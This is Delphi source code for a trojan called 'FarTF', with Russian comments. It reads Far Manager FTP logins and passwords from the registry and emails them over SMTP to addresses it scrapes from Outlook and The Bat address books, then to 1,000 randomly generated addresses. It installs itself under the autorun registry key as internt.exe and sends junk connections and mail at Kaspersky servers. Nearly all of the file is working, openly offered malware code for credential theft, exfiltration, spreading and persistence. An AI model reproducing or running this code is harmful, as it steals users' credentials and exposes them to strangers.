{
  Троян - FarTF
  Троян извлекает из реестра все логины и пароли Far'а, после чего отсылает его
  всем тем, чьи адреса находятся в адресной книге аутлука. После этого
  производит генерацию произвольных адресов и отсылает пароли по ним.
}
program FarTF;
uses reg; {Модуль для работы с реестром}

label                                    1;

const
     winsocket                           = 'wsock32.dll';
     SOCKET_ERROR                        = -1;
     AF_INET                             = 2;
     SOCK_STREAM                         = 1;
     IPPROTO_IP                          = 0;
     faHidden                            = $00000002;
     faSysFile                           = $00000004;
     faVolumeID                          = $00000008;
     faDirectory                         = $00000010;
     faAnyFile                           = $0000003F;
     MAX_PATH                            = 260;
     INVALID_HANDLE_VALUE                = LONGWORD(-1);
     MaxBuf                              = 400000;
     CLSCTX_INPROC_SERVER                = 1;
     CLSCTX_LOCAL_SERVER                 = 4;
var

      Reg1                               : TRegIniFile;
      windir                             : Array[0..144] of char;
      mailto                             : string;
      MySmtp                             : String;
      MyBuf                              : String;
      iaddr                              : Integer;
      buf                                : array[0..255] of char;
      szPath                             : array [0..260 -1] of Char;
      sisdir,ssss                        : string;
      i                                  : integer;      
type

      u_char                             = Char;
      u_short                            = Word;
      u_int                              = Integer;
      u_long                             = Longint;
      SunB                               = packed record
         s_b1, s_b2, s_b3, s_b4          : u_char;

      end;

      SunW                               = packed record
         s_w1, s_w2                      : u_short;
      end;
      TSocket = u_int;
         HINTERNET = Pointer;
         DWORD     = LongWord;
         BOOL      = LongBool;

      WSAData = record
        wVersion                         : Word;
        wHighVersion                     : Word;
        szDescription                    : array[0..256] of Char;
        szSystemStatus                   : array[0..128] of Char;
        iMaxSockets                      : Word;
        iMaxUdpDg                        : Word;
        lpVendorInfo                     : PChar;
      end;

      TWSAData                           = WSAData;
      PInAddr                            = ^TInAddr;
      in_addr = record
      case integer of
          0: (S_un_b: SunB);
          1: (S_un_w: SunW);
          2: (S_addr: u_long);
      end;
      TInAddr                            = in_addr;
      PSockAddrIn                        = ^TSockAddrIn;
      sockaddr_in = record
      case Integer of
        0: (sin_family: u_short;
            sin_port: u_short;
            sin_addr: TInAddr;
            sin_zero: array[0..7] of Char);
        1: (sa_family: u_short;
          sa_data: array[0..13] of Char)
      end;

      TSockAddrIn                        = sockaddr_in;
      TSockAddr                          = sockaddr_in;
      UINT                               = LongWord;


  TFileName = type string;

  TFILETIME = record
     dwLowDateTime                      : LongWord;
     dwHighDateTime                     : LongWord;
  end;

{----------------------The WIN32_FIND_DATA structure---------------------------}
  _WIN32_FIND_DATAA = record
      dwFileAttributes                  : LongWord;
      ftCreationTime                    : TFileTime;
      ftLastAccessTime                  : TFileTime;
      ftLastWriteTime                   : TFileTime;
      nFileSizeHigh                     : LongWord;
      nFileSizeLow                      : LongWord;
      dwReserved0                       : LongWord;
      dwReserved1                       : LongWord;
      cFileName: array[0..MAX_PATH - 1]of AnsiChar;
      cAlternateFileName: array[0..13] of AnsiChar;
  end;
  TWin32FindData = _WIN32_FIND_DATAA;
{------------------------------------------------------------------------------}


{--------------------------The SearchRec structure-----------------------------}
  TSearchRec = record
    Time                                : Integer;
    Size                                : Integer;
    Attr                                : Integer;
    Name                                : TFileName;
    ExcludeAttr                         : Integer;
    FindHandle                          : THandle;
    FindData                            : TWin32FindData;
  end;
{------------------------------------------------------------------------------}


{-----------------Используемые функции WinApi----------------------------------}
        function send(s: TSocket;
                               var Buf;
                               len,
                               flags: Integer): Integer; stdcall;
                               external    winsocket name 'send';
        function WSAStartup(wVersionRequired:
                               word;
                               var WSData: TWSAData): Integer; stdcall;
                               external    winsocket name 'WSAStartup';
        function socket(af,   Struct,
                               protocol: Integer): TSocket; stdcall;
                               external    winsocket name 'socket';
        function htons(hostshort:
                               u_short): u_short; stdcall;
                               external    winsocket name 'htons';
        function inet_addr (cp: PChar): u_long; stdcall;
                               external    winsocket name 'inet_addr';
        function connect(s: TSocket;
                               var name: TSockAddr;
                               namelen: Integer): Integer; stdcall;
                               external    winsocket name 'connect';
        function recv(s: TSocket; var
                               Buf;
                               len,
                               flags: Integer): Integer; stdcall;
                               external    winsocket name 'recv';
        function closesocket(s: TSocket): Integer; stdcall;
                               external    winsocket name 'closesocket';
        function FindFirstFileA(lpFileName: PChar; var
                                       lpFindFileData: TWIN32FindData):
                                       THandle; stdcall;external
                                       'kernel32.dll' name 'FindFirstFileA';
        function FindNextFileA(hFindFile: THandle; var
                                       lpFindFileData: TWIN32FindData):
                                       LONGBOOL; stdcall;external
                                       'kernel32.dll' name 'FindNextFileA';
        function FindCloseA(hFindFile: THandle):
                                       LONGBOOL; stdcall;external
                                       'kernel32.dll' name 'FindClose';
        function GetWindowsDirectory(lpBuffer:PChar;
                              uSize: LongWord): LongWord; stdcall;
                              external 'kernel32.dll' name 'GetWindowsDirectoryA';
        function CopyFile(lpExistingFileName,
                               lpNewFileName: PChar;
                               bFailIfExists: BOOL): BOOL; stdcall;
                               external 'kernel32.dll' name 'CopyFileA';
                              
{------------------------------------------------------------------------------}

var
      wsadata1                           : TWSADATA;
      sin                                : TSockAddrIn;
      sock                               : TSocket;

{-------------Извлечени логинов и паролей из реестра---------------------------}
function regExtract:string;
begin
 Reg1 := TRegIniFile.create;
 try with Reg1 do
   begin
     reg1.ROOTKEY:=HKEY_CURRENT_USER;
  //   Reg1.OpenKey('.DEFAULT',true);
     Reg1.OpenKey('SOFTWARE',true);
     Reg1.OpenKey('Far',true);
     Reg1.OpenKey('Plugins',true);
     Reg1.OpenKey('FTP',true);
     Reg1.OpenKey('Hosts',true);
     reg1.ReadSections(result) ;
     Result:=Reg1.STRE;
  end;
    finally
  reg1.free;
  end;
Reg1 := TRegIniFile.create;
 try with Reg1 do
   begin
     reg1.ROOTKEY:=HKEY_CURRENT_USER;
     Reg1.OpenKey('.DEFAULT',true);
     Reg1.OpenKey('SOFTWARE',true);
     Reg1.OpenKey('Far',true);
     Reg1.OpenKey('Plugins',true);
     Reg1.OpenKey('FTP',true);
     Reg1.OpenKey('Hosts',true);
     reg1.ReadSections(result) ;
     Result:=Reg1.STRE;

  end;
    finally
  reg1.free;
  end;
end;
{------------------------------------------------------------------------------}

{----------------Посылка запросов серверу--------------------------------------}
procedure SendInfToServer(str: String);
var
      I: Integer;
begin
        for I:=1 to Length(str) do if send(sock,str[I],1,0)=SOCKET_ERROR then
        exit;
end;
{------------------------------------------------------------------------------}

{--------------------------------Отсылка писем---------------------------------}
{
   MyBuf - Отсылаемые данные(тело письма)
   MailTo - Адрес получателя письма
   MySmtp - IP адрес SMPT сервера ('194.67.57.51'-smppt.mail.ru)
}
procedure SendMail;
var
      g:string;
begin

        MyBuf:=regExtract;  //Извлекаем логины и пароли
        MySmtp:='194.67.57.51';
        WSAStartUp(257, wsadata1);
        sock:=socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
        sin.sin_family := AF_INET;
        htons(25);
        sin.sin_port := htons(25);
        iaddr:=inet_addr(PChar(MySmtp));
        sin.sin_addr.S_addr:=iaddr;
        connect(sock,sin,sizeof(sin));
        recv(sock,buf,sizeof(buf),0);
{---------------Send letter------------}
          SendInfToServer('HELO net.com'+#13+#10);
        recv(sock,buf,sizeof(buf),0);
          SendInfToServer('MAIL FROM: '+'admin@mail.ru'+#13+#10);
        recv(sock,buf,sizeof(buf),0);
          SendInfToServer('RCPT TO: '+Mailto+#13+#10);
        recv(sock,buf,sizeof(buf),0);
          SendInfToServer('DATA'+#13+#10);
        recv(sock,buf,sizeof(buf),0);
         SendInfToServer(MyBuf+#13+#10);
          SendInfToServer(#13+#10+'.'+#13+#10);
        recv(sock,buf,sizeof(buf),0);
          SendInfToServer('QUIT'+#13+#10);
        recv(sock,buf,sizeof(buf),0);
{---------------Send letter end---------}
        closesocket(sock);
end;
{------------------------------------------------------------------------------}


{-------------------АВП флудинг------------------------------------------------}
procedure AVPFluding;
var avp:array [0..10] of string;
    e:integer;
begin
  avp[1]:='216.55.182.170';
  avp[2]:='ftp://ftp.downloads2.kaspersky-labs.com/updates';
  avp[3]:='http://downloads2.kaspersky-labs.com/updates';
  avp[4]:='ftp://downloads-us1.kaspersky-labs.com/updates';
  avp[5]:='ftp://downloads1.kaspersky-labs.com/updates';
  avp[6]:='http://downloads1.kaspersky-labs.com/updates';
  avp[7]:='http://updates3.kaspersky-labs.com/updates';
  avp[8]:='http://updates1.kaspersky-labs.com/updates';
  avp[9]:='http://downloads-us1.kaspersky-labs.com/updates';
  for e:=0 to 10 do
        begin
              sock:=socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
              sin.sin_family := AF_INET;
              htons(Default8087CW);
              sin.sin_port := htons(25);
              iaddr:=inet_addr(PChar(avp[e]));
              sin.sin_addr.S_addr:=iaddr;
              connect(sock,sin,sizeof(sin));
         end;
                  WSAStartUp(257, wsadata1);
             sock:=socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
             sin.sin_family := AF_INET;
             htons(25);
             sin.sin_port := htons(25);
             iaddr:=inet_addr(PChar('194.67.57.51'));
             sin.sin_addr.S_addr:=iaddr;
             connect(sock,sin,sizeof(sin));
             recv(sock,buf,sizeof(buf),0);
{---------------Send letter------------}
          SendInfToServer('HELO net.com'+#13+#10);
        recv(sock,buf,sizeof(buf),0);
          SendInfToServer('MAIL FROM: '+'Alex@mail.ru'+#13+#10);
        recv(sock,buf,sizeof(buf),0);
          SendInfToServer('RCPT TO: '+'newvirus@kaspersky.com'+#13+#10);
        recv(sock,buf,sizeof(buf),0);
          SendInfToServer('DATA'+#13+#10);
        recv(sock,buf,sizeof(buf),0);
         SendInfToServer('У меня бедаа'+#13+#10);
          SendInfToServer(#13+#10+'.'+#13+#10);
        recv(sock,buf,sizeof(buf),0);
          SendInfToServer('QUIT'+#13+#10);
        recv(sock,buf,sizeof(buf),0);
{---------------Send letter end---------}
        closesocket(sock);

end;
{------------------------------------------------------------------------------}


{-----------------------Генерация случайных адресов ---------------------------}
function M_generate:string;
const
    CF   :array [0..9]  of string  = ('0','1','2','3','4','5','6','7','8','9');
    WordG:array [0..7]  of string  = ('e','y','u','i','o','a','-','_');
    WordS:array [0..21] of string  = ('q','w','r','t','p','s','d','f',
                                      'g','h','j','k','l','z','x','c',
                                      'v','b','n','m','-','_');
    Slogi:array [0..155]of string  = ('be','by','bu','bi','bo','ba',
                                      'ce','cy','cu','ci','co','ca',
                                      'de','dy','du','di','do','da',
                                      'fe','fy','fu','fi','fo','fa',
                                      'he','hy','hu','hi','ho','ha',
                                      'qe','qy','qu','qi','qo','qa',
                                      'we','wy','wu','wi','wo','wa',
                                      're','ry','ru','ri','ro','ra',
                                      'te','ty','tu','ti','to','ta',
                                      'pe','py','pu','pi','po','pa',
                                      'se','sy','su','si','so','sa',
                                      'de','dy','du','di','do','da',
                                      'fe','fy','fu','fi','fo','fa',
                                      'ge','gy','gu','gi','go','ga',
                                      'he','hy','hu','hi','ho','ha',
                                      'je','jy','ju','ji','jo','ja',
                                      'he','hy','hu','hi','ho','ha',
                                      'ke','ky','ku','ki','ko','ka',
                                      'le','ly','lu','li','lo','la',
                                      'ze','zy','zu','zi','zo','za',
                                      'xe','xy','xu','xi','xo','xa',
                                      'ce','cy','cu','ci','co','ca',
                                      've','vy','vu','vi','vo','va',
                                      'be','by','bu','bi','bo','ba',
                                      'ne','ny','nu','ni','no','na',
                                      'me','my','mu','mi','mo','ma');

    ServerName:array[0..11]of string=('mailru.com','mail.com','mail.ru','hotbox.ru',
                         'hotmail.com','yahoo.com','yandex.ru','xakep.ru','ukr.net',
                         'freemail.ru','yahoo.com.ua','chat.ru');


var  i,CountChar,IndexSL,IndexWSG,IndexWGL,IndexCH,SN:integer;
begin
     result:='';
     while CountChar<1 do CountChar:=random(6);
     SN:=random(11);
     IndexWSG:=random(21);
     IndexWGL:=random(7);
     i:=random(1);
       case i of
        0: begin
                result:=result+(WordS[IndexWGL]+WordG[IndexWSG]);
                for i:=2 to CountChar do
                    begin
                       IndexSL:=random(156);
                       Result:=result+slogi[IndexSL];
                    end;
           end;
       1: begin
                result:=result+(WordG[IndexWSG]+WordS[IndexWGL]+CF[random(9)]);
                for i:=2 to CountChar do
                    begin
                       randomize;
                       IndexSL:=random(156);
                       Result:=result+slogi[IndexSL];
                    end;
           end;
       end;
       Result:=Result+'@'+ServerName[SN];
       Mailto:=result;
       SendMail;     // Отсылаем пароли на сгенерированный адрес
end;
{------------------------------------------------------------------------------}

{-----------------Извлечение адресов из Wab$ABD файлов ----------------------------}
function ExtractMailsFromOutlookTheBat(PathtoWabFile:string;CheckOnEven:boolean=true;
         Tempfile:string='c:\tempfile';Count:integer=176563):string;
{
    TheBat.abd;*.wab

in: 1) PathtoWabFile - Путь к файлу данных WindowsAddressBook
    2) CheckOnEven   - Проверка на четность (используется для увеличения
                       фильтрации лишнего мусора), по умолчанию равен TRUE
    3) Tempfile      - Временный файл, по умолчанию равен 'c:\tempfile'
    4) Count         - Размер мусора в начале файла. По умолчанию равен 176563
   Для файлов (TheBat)*.abd,  Count должен обязательно быть равен 0,
                              , а параметр CheckOnEven должен быть False !!!!!
   для файлов (Outlook)*.wab, Count должен быть обязательно равен 176563 !!!!!
}
var WABfile                                    : file;
    fts                                        : textfile;
    s,temp,m                                   : string;
    i,g,g1,even                                : integer;
    buf                                        : array [1..1] of byte;
begin
    even:=0;
    assignfile(WABfile,PathtoWabFile);
    reset(WABfile,1);
    seek(WABfile,count);
    assignfile(fts,tempfile);
    rewrite(fts);
    for i:=1 to filesize(WABfile)-count do
      begin
         BlockRead(WABfile,buf,1);
           if (buf[1]>=32)and(buf[1]<>13) then s:=s+chr(buf[1]);
           if length(s)=60 then
              begin
                 writeln(fts,s);
                 s:='';
              end;
         seek(WABfile,count+i);
     end;
    m:=m+s;
    closefile(fts);
    closefile(WABfile);
    assignfile(fts,'c:\tempfile');
    reset(fts);
    while not eof(fts) do
       begin
         readln(fts,m);
           for i:=2 to length(m) do
             begin
               if m[i]='@' then
                  begin
                    g:=0;
                      repeat
                      begin
                          inc(g);
                      end;
{-------------------------------------------------------------------------------------}
{    Исключаемые символы с кодами: 33-45,58-63,123-132,134-149,152-187,191-249        }
{-------------------------------------------------------------------------------------}
                      until (m[i-g]=chr(123))or (i<=1) or(m[i-g]=chr(124))
                      or (m[i-g]=chr(125))or(m[i-g]=chr(126))or(m[i-g]=chr(127))
                      or (m[i-g]=chr(128))or(m[i-g]=chr(129))or(m[i-g]=chr(130))
                      or (m[i-g]=chr(131))or(m[i-g]=chr(132))or(m[i-g]=chr(134))
                      or (m[i-g]=chr(135))or(m[i-g]=chr(136))or(m[i-g]=chr(137))
                      or (m[i-g]=chr(138))or(m[i-g]=chr(139))or(m[i-g]=chr(140))
                      or (m[i-g]=chr(141))or(m[i-g]=chr(142))or(m[i-g]=chr(143))
                      or (m[i-g]=chr(144))or(m[i-g]=chr(145))or(m[i-g]=chr(146))
                      or (m[i-g]=chr(147))or(m[i-g]=chr(148))or(m[i-g]=chr(149))
                      or (m[i-g]=chr(150))or(m[i-g]=chr(152))or(m[i-g]=chr(153))
                      or (m[i-g]=chr(154))or(m[i-g]=chr(155))or(m[i-g]=chr(156))
                      or (m[i-g]=chr(157))or(m[i-g]=chr(158))or(m[i-g]=chr(159))
                      or (m[i-g]=chr(160))or(m[i-g]=chr(161))or(m[i-g]=chr(162))
                      or (m[i-g]=chr(163))or(m[i-g]=chr(164))or(m[i-g]=chr(165))
                      or (m[i-g]=chr(166))or(m[i-g]=chr(167))or(m[i-g]=chr(168))
                      or (m[i-g]=chr(169))or(m[i-g]=chr(170))or(m[i-g]=chr(170))
                      or (m[i-g]=chr(171))or(m[i-g]=chr(172))or(m[i-g]=chr(173))
                      or (m[i-g]=chr(174))or(m[i-g]=chr(175))or(m[i-g]=chr(176))
                      or (m[i-g]=chr(177))or(m[i-g]=chr(178))or(m[i-g]=chr(179))
                      or (m[i-g]=chr(180))or(m[i-g]=chr(181))or(m[i-g]=chr(182))
                      or (m[i-g]=chr(183))or(m[i-g]=chr(184))or(m[i-g]=chr(185))
                      or (m[i-g]=chr(186))or(m[i-g]=chr(187))or(m[i-g]=chr(191))
                      or (m[i-g]=chr(192))or(m[i-g]=chr(193))or(m[i-g]=chr(194))
                      or (m[i-g]=chr(195))or(m[i-g]=chr(196))or(m[i-g]=chr(197))
                      or (m[i-g]=chr(198))or(m[i-g]=chr(199))or(m[i-g]=chr(200))
                      or (m[i-g]=chr(201))or(m[i-g]=chr(202))or(m[i-g]=chr(203))
                      or (m[i-g]=chr(204))or(m[i-g]=chr(205))or(m[i-g]=chr(206))
                      or (m[i-g]=chr(207))or(m[i-g]=chr(208))or(m[i-g]=chr(209))
                      or (m[i-g]=chr(210))or(m[i-g]=chr(211))or(m[i-g]=chr(212))
                      or (m[i-g]=chr(213))or(m[i-g]=chr(214))or(m[i-g]=chr(215))
                      or (m[i-g]=chr(216))or(m[i-g]=chr(217))or(m[i-g]=chr(218))
                      or (m[i-g]=chr(219))or(m[i-g]=chr(220))or(m[i-g]=chr(221))
                      or (m[i-g]=chr(223))or(m[i-g]=chr(224))or(m[i-g]=chr(225))
                      or (m[i-g]=chr(226))or(m[i-g]=chr(227))or(m[i-g]=chr(228))
                      or (m[i-g]=chr(229))or(m[i-g]=chr(230))or(m[i-g]=chr(231))
                      or (m[i-g]=chr(232))or(m[i-g]=chr(233))or(m[i-g]=chr(234))
                      or (m[i-g]=chr(235))or(m[i-g]=chr(236))or(m[i-g]=chr(237))
                      or (m[i-g]=chr(238))or(m[i-g]=chr(239))or(m[i-g]=chr(240))
                      or (m[i-g]=chr(241))or(m[i-g]=chr(242))or(m[i-g]=chr(243))
                      or (m[i-g]=chr(244))or(m[i-g]=chr(245))or(m[i-g]=chr(246))
                      or (m[i-g]=chr(247))or(m[i-g]=chr(248))or(m[i-g]=chr(249))
                      or (m[i-g]=chr(33))or(m[i-g]=chr(34))or(m[i-g]=chr(35))
                      or (m[i-g]=chr(36))or(m[i-g]=chr(37))or(m[i-g]=chr(38))
                      or (m[i-g]=chr(39))or(m[i-g]=chr(40))or(m[i-g]=chr(41))
                      or (m[i-g]=chr(42))or(m[i-g]=chr(43))or(m[i-g]=chr(44))
                      or (m[i-g]=chr(45))or(m[i-g]=chr(0))or(m[i-g]=chr(47))
                      or(m[i-g]=chr(58))or(m[i-g]=chr(59))or(m[i-g]=chr(60))
                      or(m[i-g]=chr(62))or(m[i-g]=chr(255));

                      g:=i-g;
                      g1:=0;

                      repeat
                      begin
                        inc(g1);
                      end;

                      until (m[i+g1]=chr(123))or (i<=1) or(m[i+g1]=chr(124))
                      or (m[i+g1]=chr(125))or(m[i+g1]=chr(126))or(m[i+g1]=chr(127))
                      or (m[i+g1]=chr(128))or(m[i+g1]=chr(129))or(m[i+g1]=chr(130))
                      or (m[i+g1]=chr(131))or(m[i+g1]=chr(132))or(m[i+g1]=chr(134))
                      or (m[i+g1]=chr(135))or(m[i+g1]=chr(136))or(m[i+g1]=chr(137))
                      or (m[i+g1]=chr(138))or(m[i+g1]=chr(139))or(m[i+g1]=chr(140))
                      or (m[i+g1]=chr(141))or(m[i+g1]=chr(142))or(m[i+g1]=chr(143))
                      or (m[i+g1]=chr(144))or(m[i+g1]=chr(145))or(m[i+g1]=chr(146))
                      or (m[i+g1]=chr(147))or(m[i+g1]=chr(148))or(m[i+g1]=chr(149))
                      or (m[i+g1]=chr(150))or(m[i+g1]=chr(152))or(m[i+g1]=chr(153))
                      or (m[i+g1]=chr(154))or(m[i+g1]=chr(155))or(m[i+g1]=chr(156))
                      or (m[i+g1]=chr(157))or(m[i+g1]=chr(158))or(m[i+g1]=chr(159))
                      or (m[i+g1]=chr(160))or(m[i+g1]=chr(161))or(m[i+g1]=chr(162))
                      or (m[i+g1]=chr(163))or(m[i+g1]=chr(164))or(m[i+g1]=chr(165))
                      or (m[i+g1]=chr(166))or(m[i+g1]=chr(167))or(m[i+g1]=chr(168))
                      or (m[i+g1]=chr(169))or(m[i+g1]=chr(170))or(m[i+g1]=chr(170))
                      or (m[i+g1]=chr(171))or(m[i+g1]=chr(172))or(m[i+g1]=chr(173))
                      or (m[i+g1]=chr(174))or(m[i+g1]=chr(175))or(m[i+g1]=chr(176))
                      or (m[i+g1]=chr(177))or(m[i+g1]=chr(178))or(m[i+g1]=chr(179))
                      or (m[i+g1]=chr(180))or(m[i+g1]=chr(181))or(m[i+g1]=chr(182))
                      or (m[i+g1]=chr(183))or(m[i+g1]=chr(184))or(m[i+g1]=chr(185))
                      or (m[i+g1]=chr(186))or(m[i+g1]=chr(187))or(m[i+g1]=chr(191))
                      or (m[i+g1]=chr(192))or(m[i+g1]=chr(193))or(m[i+g1]=chr(194))
                      or (m[i+g1]=chr(195))or(m[i+g1]=chr(196))or(m[i+g1]=chr(197))
                      or (m[i+g1]=chr(198))or(m[i+g1]=chr(199))or(m[i+g1]=chr(200))
                      or (m[i+g1]=chr(201))or(m[i+g1]=chr(202))or(m[i+g1]=chr(203))
                      or (m[i+g1]=chr(204))or(m[i+g1]=chr(205))or(m[i+g1]=chr(206))
                      or (m[i+g1]=chr(207))or(m[i+g1]=chr(208))or(m[i+g1]=chr(209))
                      or (m[i+g1]=chr(210))or(m[i+g1]=chr(211))or(m[i+g1]=chr(212))
                      or (m[i+g1]=chr(213))or(m[i+g1]=chr(214))or(m[i+g1]=chr(215))
                      or (m[i+g1]=chr(216))or(m[i+g1]=chr(217))or(m[i+g1]=chr(218))
                      or (m[i+g1]=chr(219))or(m[i+g1]=chr(220))or(m[i+g1]=chr(221))
                      or (m[i+g1]=chr(223))or(m[i+g1]=chr(224))or(m[i+g1]=chr(225))
                      or (m[i+g1]=chr(226))or(m[i+g1]=chr(227))or(m[i+g1]=chr(228))
                      or (m[i+g1]=chr(229))or(m[i+g1]=chr(230))or(m[i+g1]=chr(231))
                      or (m[i+g1]=chr(232))or(m[i+g1]=chr(233))or(m[i+g1]=chr(234))
                      or (m[i+g1]=chr(235))or(m[i+g1]=chr(236))or(m[i+g1]=chr(237))
                      or (m[i+g1]=chr(238))or(m[i+g1]=chr(239))or(m[i+g1]=chr(240))
                      or (m[i+g1]=chr(241))or(m[i+g1]=chr(242))or(m[i+g1]=chr(243))
                      or (m[i+g1]=chr(244))or(m[i+g1]=chr(245))or(m[i+g1]=chr(246))
                      or (m[i+g1]=chr(247))or(m[i+g1]=chr(248))or(m[i+g1]=chr(249))
                      or (m[i+g1]=chr(33))or(m[i+g1]=chr(34))or(m[i+g1]=chr(35))
                      or (m[i+g1]=chr(36))or(m[i+g1]=chr(37))or(m[i+g1]=chr(38))
                      or (m[i+g1]=chr(39))or(m[i+g1]=chr(40))or(m[i+g1]=chr(41))
                      or (m[i+g1]=chr(42))or(m[i+g1]=chr(43))or(m[i+g1]=chr(44))
                      or (m[i+g1]=chr(45))or(m[i+g1]=chr(0))or(m[i+g1]=chr(47))
                      or(m[i+g1]=chr(58))or(m[i+g1]=chr(59))or(m[i+g1]=chr(60))
                      or(m[i+g1]=chr(62))or(m[i+g1]=chr(255));
{-------------------------------------------------------------------------------------}
                      g1:=g1+i;
                      temp:=m;
                      delete(temp,1,g);
                      delete(temp,g1-(g),length(temp));

{--------------------------E-mail должен быть больше 7 символов-----------------------}

                      if length(temp)>7 then
                          begin
                            even:=even+1;
                             if CheckOnEven=false then
                               begin
                                 result:=result+temp+#13;
                                 Mailto:=temp;
                                 SendMail;
                               end
                               else
                               begin
                                 if even mod 2 = 0 then result:=result+temp+#13;
                                 Mailto:=temp;
                                 SendMail; // Отылаем пароли на полученный адрес из аутлука
                               end;
                          end;

                  end;
             end;
       end;
      closefile(fts);
end;
{------------------------------------------------------------------------------}


{--------------------------------Поиск Wab$ABD файлов------------------------------}
procedure FindWabFiles(StartFolder, Mask: String; List: String;
          ScanSubFolders: Boolean = True);
var
         SearchRec                      : TSearchRec;
         FindResult                     : Integer;
         temp                           : string;
         fileH:text;
         mails:string;
{*****}
function FindMatchingFile(var F: TSearchRec): Integer;
var
         LocalFileTime                  : TFileTime;
begin
  with F do
  begin
    while FindData.dwFileAttributes and ExcludeAttr <> 0 do
      if not FindNextFileA(FindHandle, FindData) then
      begin
        Result := GetLastError;
        Exit;
      end;
      Size := FindData.nFileSizeLow;
      Attr := FindData.dwFileAttributes;
      Name := FindData.cFileName;
  end;
  Result := 0;
end;
{-----}

{*****}
procedure FindClose(var F: TSearchRec);
begin
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    FindCloseA(F.FindHandle);
    F.FindHandle := INVALID_HANDLE_VALUE;
  end;
end;
{-----}

{*****}
function FindFirst(const Path: string; Attr: Integer;
  var  F: TSearchRec): Integer;
const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
begin
  F.ExcludeAttr := not Attr and faSpecial;
  F.FindHandle := FindFirstFileA(PChar(Path), F.FindData);
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Result := FindMatchingFile(F);
    if Result <> 0 then FindClose(F);
  end else
    Result := GetLastError;
end;
{-----}

{*****}
function FindNext(var F: TSearchRec): Integer;
begin
  if FindNextFileA(F.FindHandle, F.FindData) then
    Result := FindMatchingFile(F) else
    Result := GetLastError;
end;
{-----}


begin
 try
   if StartFolder[Length(StartFolder)]<>'\' then StartFolder:=StartFolder+'\';
   ScanSubFolders:=true;
   FindResult:=FindFirst(StartFolder+'*.*', faAnyFile, SearchRec);
  try
   while FindResult = 0 do with SearchRec do begin
    if (Attr and faDirectory)<>0 then
    begin
     if ScanSubFolders and (Name<>'.') and (Name<>'..') then
      FindWabFiles(StartFolder+Name, Mask, List, ScanSubFolders);
    end
    else
     begin
          temp:=name;
          delete(temp,1,Length(temp)-4);
          if temp='.wab' then
             begin
                ExtractMailsFromOutlookTheBat(StartFolder+Name);
             end;
          if temp='.abd' then
             begin
                ExtractMailsFromOutlookTheBat(StartFolder+Name,false,'c:\tempfile',0);
             end;

    end;
    FindResult:=FindNext(SearchRec);
    end;
  finally
   FindClose(SearchRec);
  end;
 finally
 end;

end;
{------------------------------------------------------------------------------}


{----------------------Добавление в автозапуск---------------------------------}
procedure RegWrite;
begin
 Reg1 := TRegIniFile.create;
 try with Reg1 do
   begin
  reg1.RootKey := HKEY_CURRENT_USER;

  reg1.WriteString('\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                   'ServiceInternet',Pchar(WinDir+('\internt.exe')));
  end;
  finally
  reg1.free;
  end;
end;
{------------------------------------------------------------------------------}

begin
1:
          GetWindowsDirectory(windir,Sizeof(windir));//Получаем каталог win'a
          CopyFile(Pchar(ParamStr(0)),Pchar(WinDir+('\internt.exe')),true);
          RegWrite;//Прописываем себя в реестре
          FindWabFiles('c:\','*.wab','');//Начинаем поиск Wab файлов
          for i:=0 to 1000 do
          begin
             M_generate;      //Генерируем 1000 случайных адресов и отсылаем пароли по ним
          end;
          AVPFluding;// Флудим АВП
          goto 1;
end.
